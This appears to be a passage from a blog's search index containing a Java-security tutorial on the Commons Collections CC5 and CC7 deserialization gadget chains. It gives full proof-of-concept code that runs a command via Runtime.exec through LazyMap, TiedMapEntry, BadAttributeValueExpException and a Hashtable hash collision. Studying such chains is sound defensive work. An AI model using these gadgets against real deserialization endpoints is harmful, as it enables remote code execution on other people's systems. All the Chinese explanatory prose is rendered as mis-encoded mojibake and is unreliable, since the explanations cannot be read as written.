<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>javaå®‰å…¨-CC5&amp;CC7</title>
      <link href="/2026/01/28/CC5-7-Gadget/"/>
      <url>/2026/01/28/CC5-7-Gadget/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå®‰å…¨-CC5-CC7"><a href="#javaå®‰å…¨-CC5-CC7" class="headerlink" title="javaå®‰å…¨-CC5&amp;CC7"></a>javaå®‰å…¨-CC5&amp;CC7</h1><ul><li><strong>è¿™ä¿©æ¡é“¾éƒ½æ˜¯åœ¨ Hashmap#get æ–¹æ³•ä¹‹ä¸Šï¼Œå˜æ¢äº†ä¸ CC1 ä¸åŒçš„å…¥å£ç±»å³ readObject æ–¹æ³•è°ƒç”¨ç±»</strong></li></ul><h2 id="ä¸€ã€CC5"><a href="#ä¸€ã€CC5" class="headerlink" title="ä¸€ã€CC5"></a>ä¸€ã€CC5</h2><h3 id="1-ä¸»è¦é€»è¾‘"><a href="#1-ä¸»è¦é€»è¾‘" class="headerlink" title="1.ä¸»è¦é€»è¾‘"></a>1.ä¸»è¦é€»è¾‘</h3><h4 id="BadAttributeValueExpException-readObject"><a href="#BadAttributeValueExpException-readObject" class="headerlink" title="BadAttributeValueExpException#readObject"></a><code>BadAttributeValueExpException#readObject</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272140355.png" alt="image-20260127214015127"></p><p><code>readObject</code>æ–¹æ³•è°ƒç”¨<code>toString</code>æ–¹æ³•</p><h4 id="TiedMapEntry-toString"><a href="#TiedMapEntry-toString" class="headerlink" title="TiedMapEntry#toString"></a><code>TiedMapEntry#toString</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272141763.png" alt="image-20260127214119652"></p><p><code>TiedMapEntry#toString</code>è¿™ä¸ªæ–¹æ³•å±äº<code>CC1</code>ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œæ¥ç€çœ‹<code>getValue</code>æ–¹æ³•</p><h4 id="TiedMapEntry-getValue"><a href="#TiedMapEntry-getValue" class="headerlink" title="TiedMapEntry#getValue"></a><code>TiedMapEntry#getValue</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272143245.png" alt="image-20260127214350029"></p><p>è¿™é‡Œä¼šè°ƒç”¨<code>get</code>æ–¹æ³•ï¼Œè€Œ<code>LazyMap</code>çš„<code>get</code>æ–¹æ³•ä¼šè°ƒç”¨é“¾è·¯<code>transform</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272144917.png" alt="image-20260127214451842"></p><h3 id="2-poc"><a href="#2-poc" class="headerlink" title="2.poc"></a>2.poc</h3><p>ç¼–å†™<code>poc</code>ï¼Œå°è¯•æ»¡è¶³æ¡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272147468.png" alt="image-20260127214719358"></p><p><code>BadAttributeValueExpException</code>è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ä¼šæ¯æ‰æˆ‘ä»¬çš„æ¶æ„ç±»<code>tiedMapEntry</code>ï¼Œäºæ˜¯è¦é€šè¿‡åå°„æœ€åä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(obj2,<span class="string">&quot;val&quot;</span>,tiedMapEntry);</span><br></pre></td></tr></table></figure><p><strong>æ€»poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Transformer[] chuan = &#123;chaun0,chuan1,chuan2,chuan3&#125;;</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.lazyMap(map,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(chuan));</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">setFieldValue(obj2,<span class="string">&quot;val&quot;</span>,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">serialize(obj2);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure><p><strong>æˆåŠŸ</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272146136.png" alt="image-20260127214627047"></p><h2 id="äºŒã€CC7"><a href="#äºŒã€CC7" class="headerlink" title="äºŒã€CC7"></a>äºŒã€CC7</h2><h3 id="1-å…³é”®ç±»"><a href="#1-å…³é”®ç±»" class="headerlink" title="1.å…³é”®ç±»"></a>1.å…³é”®ç±»</h3><h4 id="Hashtable-readObject"><a href="#Hashtable-readObject" class="headerlink" title="Hashtable#readObject"></a><code>Hashtable#readObject</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272215056.png" alt="image-20260127221505217"></p><p>è¿™é‡Œè°ƒç”¨äº†<code>Hashtable#reconstitutionPut</code>æ–¹æ³•</p><h4 id="Hashtable-reconstitutionPut"><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable#reconstitutionPut"></a><code>Hashtable#reconstitutionPut</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272215288.png" alt="image-20260127221558196"></p><p>è¿™é‡Œè°ƒç”¨äº†<code>equals</code>æ–¹æ³•</p><h4 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap#equals"></a><code>AbstractMap#equals</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272218347.png" alt="image-20260127221751012"></p><p><code>AbstractMap#equals</code><strong>æ–¹æ³•ä¼šè°ƒç”¨ get æ–¹æ³•ï¼Œåˆšå¥½æ¥ä¸Šé“¾æ¡ååŠæ®µ</strong></p><h3 id="2-ä¸»è¦é€»è¾‘"><a href="#2-ä¸»è¦é€»è¾‘" class="headerlink" title="2.ä¸»è¦é€»è¾‘"></a>2.ä¸»è¦é€»è¾‘</h3><h4 id="Aã€reconstitutionPutæ–¹æ³•"><a href="#Aã€reconstitutionPutæ–¹æ³•" class="headerlink" title="Aã€reconstitutionPutæ–¹æ³•"></a>Aã€<code>reconstitutionPut</code>æ–¹æ³•</h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272220746.png" alt="image-20260127222020653"></p><p>è¿™ä¸ªæ–¹æ³•è°ƒç”¨<code>equals</code>æ˜¯æœ‰æ¡ä»¶çš„</p><p><code>Hashtable</code> é‡Œéœ€è¦æœ‰ä¸¤ä¸ª Mapï¼ˆ<code>lazyMap1</code> å’Œ <code>lazyMap2</code>ï¼‰ï¼Œå®ƒä»¬çš„ HashCode æ˜¯ä¸€æ ·çš„ï¼Œè¿™æ„å‘³ç€å®ƒä»¬éƒ½è¦å­˜è¿›<strong>åŒä¸€ä¸ªç¼–å·çš„æŸœå­</strong>ï¼ˆæ¯”å¦‚ç¬¬ 5 å·æŸœå­ï¼‰ã€‚</p><p>ç¬¬ä¸€è½®ï¼šå­˜å…¥ <code>lazyMap1</code></p><ol><li><strong>æ£€æŸ¥æŸœå­</strong>ï¼šç¨‹åºèµ°åˆ° <code>for</code> å¾ªç¯ï¼Œå»çœ‹ <code>tab[5]</code>ï¼ˆç¬¬ 5 å·æŸœå­ï¼‰ã€‚</li><li><strong>å‘ç°ä¸ºç©º</strong>ï¼šæ­¤æ—¶æŸœå­æ˜¯ç©ºçš„ï¼ˆ<code>null</code>ï¼‰ã€‚</li><li><strong>è·³è¿‡å¾ªç¯</strong>ï¼šå› ä¸º <code>e == null</code>ï¼Œ<strong>for å¾ªç¯ä¸€æ¬¡éƒ½ä¸ä¼šæ‰§è¡Œ</strong>ã€‚å½“ç„¶ä¹Ÿå°±ä¸ä¼šæ‰§è¡Œé‡Œé¢çš„ <code>e.key.equals(key)</code>ã€‚</li><li><strong>ç›´æ¥å­˜å…¥</strong>ï¼šç¨‹åºè·³è¿‡å¾ªç¯ï¼Œæ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼ŒæŠŠ <code>decorateMap1</code> æ”¾è¿›äº† <code>tab[5]</code>ã€‚</li></ol><p>ç¬¬äºŒè½®ï¼šå­˜å…¥ <code>lazyMap2</code></p><ol><li><strong>æ£€æŸ¥æŸœå­</strong>ï¼šç¨‹åºå†æ¬¡èµ°åˆ° <code>for</code> å¾ªç¯ï¼Œå»çœ‹ <code>tab[5]</code>ã€‚</li><li><strong>å‘ç°æœ‰äºº</strong>ï¼šæ­¤æ—¶ <code>tab[5]</code> é‡Œå·²ç»åç€ <code>decorateMap1</code> äº†ï¼ˆ<code>e != null</code>ï¼‰ã€‚</li><li><strong>è¿›å…¥å¾ªç¯</strong>ï¼šå› ä¸ºæŸœå­ä¸ä¸ºç©ºï¼Œç¨‹åº<strong>è¢«è¿«è¿›å…¥å¾ªç¯</strong>ã€‚</li><li><strong>è¿›è¡Œç›˜é—® (è§¦å‘æ¼æ´)</strong>ï¼š<ul><li>ç¨‹åºå¿ƒæƒ³ï¼šâ€œè¿™ä¸ªæ–°æ¥çš„ï¼ˆ<code>lazyMap2</code>ï¼‰å’Œå·²ç»åœ¨é‡Œé¢çš„ï¼ˆ<code>lazyMap1</code>ï¼‰æ˜¯ä¸æ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Ÿâ€</li><li>å®ƒæ‰§è¡Œäº† <code>e.key.equals(key)</code>ï¼Œä¹Ÿå°±æ˜¯ <code>decorateMap1.equals(decorateMap2)</code>ã€‚</li><li><strong>ğŸ’¥ è½°ï¼</strong> è¿™ä¸€æ¯”è¾ƒï¼Œè§¦å‘äº† <code>LazyMap</code> çš„ <code>get</code>ï¼Œå¼¹å‡ºäº†è®¡ç®—å™¨ã€‚</li></ul></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// éå†å“ˆå¸Œæ¡¶ï¼ˆé“¾è¡¨ï¼‰ï¼Œæ£€æŸ¥é‡Œé¢æ˜¯ä¸æ˜¯å·²ç»æœ‰è¿™ä¸ª Key äº†</span></span><br><span class="line"><span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¦‚æœ Hash å€¼ä¸€æ ·ï¼Œå¹¶ä¸” Key çš„å†…å®¹ä¹Ÿä¸€æ ·ï¼ˆequals è¿”å› trueï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æŠ›å‡ºå¼‚å¸¸ï¼šæ•°æ®æµæŸåï¼ˆå› ä¸º Map ä¸å…è®¸æœ‰é‡å¤çš„ Keyï¼ï¼‰</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>åŒæ—¶ï¼Œä¸ºäº†æ„é€  e.hash &#x3D;&#x3D; hash ï¼Œæ‰¾åˆ°javaä¸­çš„ä¸€ä¸ªå° bug</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;yy&quot;</span>.hashCode() == <span class="string">&quot;zZ&quot;</span>.hashCode()</span><br></pre></td></tr></table></figure><p><strong>æœ€åä¾¿æ˜¯</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span>  <span class="operator">=</span> LazyMap.lazyMap(map1,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(chuan));</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.lazyMap(map2,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(chuan));</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">obj2.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">obj2.put(lazyMap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>é—®é¢˜1ï¼š<code>equals</code> çš„â€œæ‡’æƒ°â€ä¼˜åŒ–ï¼ˆç›´æ¥è¿”å›ï¼‰</p><p>å¦‚æœä½ ä¼ çš„æ˜¯<strong>åŒä¸€ä¸ªå¯¹è±¡</strong>ï¼ˆæ¯”å¦‚ <code>put(map1, val); put(map1, val);</code>ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// AbstractMap.equals æºç ç¬¬ä¸€è¡Œ</span><br><span class="line">if (o == this)</span><br><span class="line">    return true;</span><br></pre></td></tr></table></figure><ul><li><strong>åæœ</strong>ï¼šä»£ç åœ¨ç¬¬ä¸€è¡Œå°±æ£€æµ‹åˆ°æ˜¯åŒä¸€ä¸ªå¯¹è±¡å¼•ç”¨ï¼Œç›´æ¥è¿”å› <code>true</code>ã€‚</li><li><strong>ç»“å±€</strong>ï¼šåé¢çš„é€»è¾‘å…¨éƒ¨è·³è¿‡ï¼Œæ ¹æœ¬ä¸ä¼šæ‰§è¡Œ <code>m.get()</code>ï¼Œè®¡ç®—å™¨å¼¹ä¸å‡ºæ¥ã€‚</li></ul><p>é—®é¢˜2ï¼šLazyMap çš„â€œç¼ºè´§â€æœºåˆ¶ï¼ˆè¿™æ˜¯æœ€å…³é”®çš„ï¼ï¼‰</p><p>å‡è®¾ä½ ä¼ äº†<strong>ä¸¤ä¸ªä¸åŒçš„å¯¹è±¡</strong>ï¼Œä½†å®ƒä»¬çš„<strong>å†…å®¹æ˜¯ä¸€æ ·</strong>çš„ï¼ˆæ¯”å¦‚ <code>map1</code> é‡Œæœ‰ key â€œyyâ€ï¼Œ<code>map2</code> é‡Œä¹Ÿæœ‰ key â€œyyâ€ï¼‰ã€‚</p><p>å½“ <code>Hashtable</code> å¼ºè¿«å®ƒä»¬æ¯”è¾ƒæ—¶ï¼Œ<code>AbstractMap.equals</code> ä¼šæ‰§è¡Œä»¥ä¸‹é€»è¾‘ï¼š</p><ol><li><code>map1</code> è¯´ï¼šâ€œæˆ‘æœ‰ key <code>&quot;yy&quot;</code>ï¼Œæˆ‘è¦å»æ£€æŸ¥ <code>map2</code> æœ‰æ²¡æœ‰è¿™ä¸ª keyã€‚â€</li><li>ä»£ç æ‰§è¡Œï¼š<code>map2.get(&quot;yy&quot;)</code>ã€‚</li><li><strong>å…³é”®æ—¶åˆ»</strong>ï¼š<ul><li><code>LazyMap</code> çš„é€»è¾‘æ˜¯ï¼š<strong>â€œåªæœ‰å½“ä½ æ‰¾æˆ‘è¦ä¸€ä¸ªæˆ‘ä¸å­˜åœ¨çš„ key æ—¶ï¼Œæˆ‘æ‰ä¼šå»è°ƒç”¨ Transformerï¼ˆæ‰§è¡Œå‘½ä»¤ï¼‰ã€‚â€</strong></li><li>å› ä¸º <code>map2</code> é‡Œé¢<strong>ä¹Ÿæœ‰</strong> <code>&quot;yy&quot;</code>ï¼Œå®ƒä¼šç›´æ¥æŠŠå€¼è¿”å›ç»™ä½ ã€‚</li></ul></li><li><strong>ç»“å±€</strong>ï¼š<code>get</code> æ–¹æ³•æ­£å¸¸è¿”å›ï¼Œä¸è§¦å‘ Transformerï¼Œè®¡ç®—å™¨å¼¹ä¸å‡ºæ¥ã€‚</li></ol><p> <strong>â€œyyâ€ å’Œ â€œzZâ€ è¿™ç§ç»„åˆ</strong></p><ol><li><strong>æ—¢éª—è¿‡ Hashtable</strong>ï¼šè®©å®ƒä»¥ä¸ºè¿™ä¸¤ä¸ª Map æ˜¯ä¸€æ ·çš„ï¼ˆHashCode å¿…é¡»ç›¸åŒï¼‰ï¼Œè¿™æ ·æ‰èƒ½å¼ºè¿«å®ƒä»¬èµ°è¿›åŒä¸€ä¸ªæŸœå­ï¼Œè§¦å‘ <code>equals</code> æ¯”è¾ƒã€‚<ul><li>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆé€‰ <code>&quot;yy&quot;</code> å’Œ <code>&quot;zZ&quot;</code>ï¼Œå› ä¸ºå®ƒä¿© HashCode ä¸€æ ·ï¼Œå¯¼è‡´åŒ…è£¹å®ƒä»¬çš„ Map HashCode ä¹Ÿä¸€æ ·ã€‚</li></ul></li><li><strong>åˆéª—è¿‡ LazyMap</strong>ï¼šè®©å®ƒå‘ç°è¿™ä¸¤ä¸ª Map å†…å®¹å…¶å®ä¸ä¸€æ ·ï¼ˆKey ä¸åŒï¼‰ï¼Œè¿™æ ·æ‰èƒ½è§¦å‘â€œæ‰¾ä¸åˆ° Keyâ€çš„é€»è¾‘ã€‚<ul><li><code>map1</code> æœ‰ <code>&quot;yy&quot;</code>ã€‚</li><li><code>map2</code> æœ‰ <code>&quot;zZ&quot;</code> (æ²¡æœ‰ <code>&quot;yy&quot;</code>)ã€‚</li><li>å½“ <code>map1</code> æ‹¿ <code>&quot;yy&quot;</code> å»é—® <code>map2</code> æ—¶ï¼Œ<code>map2</code> å‘ç°è‡ªå·±æ²¡è´§ï¼Œäºæ˜¯è§¦å‘ Transformerï¼Œ<strong>BOOMï¼</strong></li></ul></li></ol><h4 id="Bã€AbstractMap-equalsæ–¹æ³•é€»è¾‘"><a href="#Bã€AbstractMap-equalsæ–¹æ³•é€»è¾‘" class="headerlink" title="Bã€AbstractMap#equalsæ–¹æ³•é€»è¾‘"></a>Bã€<code>AbstractMap#equals</code>æ–¹æ³•é€»è¾‘</h4><ol><li><strong>Hashtable#reconstitutionPut</strong><ul><li><strong>ä½ çš„ç†è§£</strong>ï¼šç¡®å®æ˜¯èµ·ç‚¹ã€‚å› ä¸º Hash ç¢°æ’ï¼Œè§¦å‘äº† <code>e.key.equals(key)</code>ã€‚</li><li><strong>å®é™…åŠ¨ä½œ</strong>ï¼š<code>lazyMap1.equals(lazyMap2)</code>ã€‚</li></ul></li><li><strong>LazyMap#equals</strong><ul><li><strong>ä½ çš„ç†è§£</strong>ï¼šå®ƒæ²¡æœ‰è¿™ä¸ªæ–¹æ³•ã€‚</li><li><strong>å®é™…åŠ¨ä½œ</strong>ï¼šJVM è‡ªåŠ¨å»æŸ¥å®ƒçš„çˆ¶ç±» <code>AbstractMapDecorator</code>ã€‚</li></ul></li><li><strong>AbstractMapDecorator#equals</strong><ul><li><strong>ä½ çš„ç†è§£</strong>ï¼šè°ƒç”¨ <code>decorated().equals(object)</code>ã€‚</li><li><strong>å®é™…åŠ¨ä½œ</strong>ï¼šè¿™å°±æ˜¯**â€œç”©é”…â€**ã€‚å®ƒæŠŠåˆ¤æ–­ä»»åŠ¡è½¬äº¤ç»™äº†å®ƒåŒ…è£¹çš„ <code>map</code>ï¼ˆä¹Ÿå°±æ˜¯ <code>hashMap1</code>ï¼‰ã€‚æ­¤æ—¶å˜æˆäº† <code>hashMap1.equals(lazyMap2)</code>ã€‚</li></ul></li><li><strong>HashMap#equals</strong><ul><li><strong>ä½ çš„ç†è§£</strong>ï¼šHashMap ä¹Ÿæ²¡æœ‰è¿™ä¸ªæ–¹æ³•ã€‚</li><li><strong>å®é™…åŠ¨ä½œ</strong>ï¼šJVM ç»§ç»­å‘ä¸Šæ‰¾çˆ¶ç±»ï¼Œæ‰¾åˆ°äº† <code>AbstractMap</code>ã€‚</li></ul></li><li><strong>AbstractMap#equals</strong><ul><li><strong>ä½ çš„ç†è§£</strong>ï¼šåœ¨è°ƒç”¨å®ƒçš„çˆ¶ç±»ï¼Œæœ€ç»ˆè°ƒç”¨ <code>get</code> æ–¹æ³•ã€‚</li><li><strong>å®é™…åŠ¨ä½œ</strong>ï¼šè¿™æ˜¯**â€œå‡¶æ‰‹â€**ã€‚å®ƒåœ¨å¯¹æ¯”è¿‡ç¨‹ä¸­ï¼Œæ‹¿ <code>hashMap1</code> é‡Œçš„ key (â€œyyâ€)ï¼Œå»è°ƒç”¨ä¼ å…¥å‚æ•° <code>m</code> (å³ <code>lazyMap2</code>) çš„ <code>get(&quot;yy&quot;)</code>ã€‚</li></ul></li></ol><p>æœ€åä¸€æ­¥ <code>AbstractMap#equals</code> é‡Œï¼Œæ˜¯è°è°ƒç”¨çš„ <code>get</code></p><p>åœ¨ <code>AbstractMap.equals(Object o)</code> æºç ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="comment">// ... å‰é¢çš„æ£€æŸ¥ ...</span></span><br><span class="line">    Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o; <span class="comment">// è¿™é‡Œçš„ m å°±æ˜¯ lazyMap2</span></span><br><span class="line"></span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">        Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey(); <span class="comment">// è¿™é‡Œå–å‡ºçš„ key æ˜¯ &quot;yy&quot; (æ¥è‡ª lazyMap1)</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ã€æ ¸å¿ƒè§¦å‘ç‚¹ã€‘</span></span><br><span class="line">        <span class="comment">// è¿™é‡Œçš„ m æ˜¯ lazyMap2</span></span><br><span class="line">        <span class="comment">// æ‰€ä»¥è¿™é‡Œæ‰§è¡Œçš„æ˜¯ lazyMap2.get(&quot;yy&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!value.equals(m.get(key))) <span class="comment">// &lt;--- ç‚¸å¼¹åœ¨è¿™é‡Œå¼•çˆ†</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Cã€removeæ–¹æ³•"><a href="#Cã€removeæ–¹æ³•" class="headerlink" title="Cã€removeæ–¹æ³•"></a>Cã€<code>remove</code>æ–¹æ³•</h4><p>å½“åœ¨æœ¬åœ°æ‰§è¡Œ <code>hashtable.put(lazyMap2, 1)</code> æ—¶ï¼Œç”±äºå“ˆå¸Œç¢°æ’è§¦å‘äº† <code>equals</code>ï¼Œå¯¼è‡´ <code>AbstractMap</code> è°ƒç”¨äº† <code>lazyMap2.get(&quot;yy&quot;)</code>ã€‚</p><p>è¿™æ—¶å€™ï¼Œ<code>LazyMap</code> å†…éƒ¨å‘ç”Ÿäº†å¦‚ä¸‹ååº”ï¼š</p><ol><li><strong><code>if (map.containsKey(&quot;yy&quot;) == false)</code></strong>ï¼š<ul><li>æ­¤æ—¶ <code>lazyMap2</code> åªæœ‰ <code>&quot;zZ&quot;</code>ï¼Œæ²¡æœ‰ <code>&quot;yy&quot;</code>ã€‚</li><li>æ¡ä»¶æˆç«‹ï¼Œè¿›å…¥ <code>if</code> å†…éƒ¨ã€‚</li></ul></li><li><strong><code>Object value = factory.transform(&quot;yy&quot;)</code></strong>ï¼š<ul><li>è¿™é‡Œçš„ <code>factory</code> å°±æ˜¯ä½ æ„é€ çš„ <code>ChainedTransformer</code>ã€‚</li><li>å¦‚æœæ˜¯æœ¬åœ°è°ƒè¯•ï¼ˆæ²¡æŠŠ Transformer è®¾ä¸ºç©ºï¼‰ï¼Œè¿™é‡Œå°±å·²ç»å¼¹å‡ºè®¡ç®—å™¨äº†ã€‚</li><li><code>value</code> å˜æˆäº† Transformer æ‰§è¡Œåçš„ç»“æœï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªå¯¹è±¡æˆ–è€… Process ç»“æœï¼‰ã€‚</li></ul></li><li><strong><code>map.put(&quot;yy&quot;, value)</code> (è¿™å°±æ˜¯ä½ è¦æ‰¾çš„ä»£ç ï¼)</strong>ï¼š<ul><li><strong>æ³¨æ„ï¼</strong> <code>LazyMap</code> å¹¶æ²¡æœ‰æŠŠè¿™ä¸ªå€¼ç”¨å®Œå³å¼ƒï¼Œè€Œæ˜¯<strong>æ°¸ä¹…æ€§åœ°å­˜å…¥äº†è‡ªå·±çš„ HashMap ä¸­</strong>ã€‚</li><li>ä»è¿™ä¸€åˆ»èµ·ï¼Œ<code>lazyMap2</code> çš„è‚šå­é‡Œå°±å¤šäº†ä¸€ä¸ªé”®å€¼å¯¹ï¼š<code>&quot;yy&quot; -&gt; value</code>ã€‚</li></ul></li><li><strong><code>return value</code></strong>ï¼š<ul><li>è¿”å›ç»“æœï¼Œæ–¹æ³•ç»“æŸã€‚</li></ul></li></ol><p>å¯¹åº”<code>get</code>æ–¹æ³•æºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 